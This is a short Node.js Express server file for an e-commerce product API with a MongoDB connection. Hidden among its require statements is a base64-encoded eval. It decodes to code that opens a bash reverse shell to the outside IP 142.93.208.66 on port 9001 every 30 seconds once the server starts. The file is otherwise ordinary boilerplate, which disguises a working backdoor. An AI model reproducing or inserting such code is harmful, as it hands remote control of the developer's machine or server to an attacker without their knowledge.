const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const productRoutes = require('./routes/productRoutes');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

const app = express();
app.use(cors());
app.use(express.json());

// Conectando ao MongoDB (ajuste para sua URI MongoDB)
mongoose.connect('mongodb://localhost:27017/ecommerce', {
    useNewUrlParser: true,
    useUnifiedTopology: true
});

app.use('/api/products', productRoutes);

app.listen(5000, () => console.log('Server running on port 5000'));
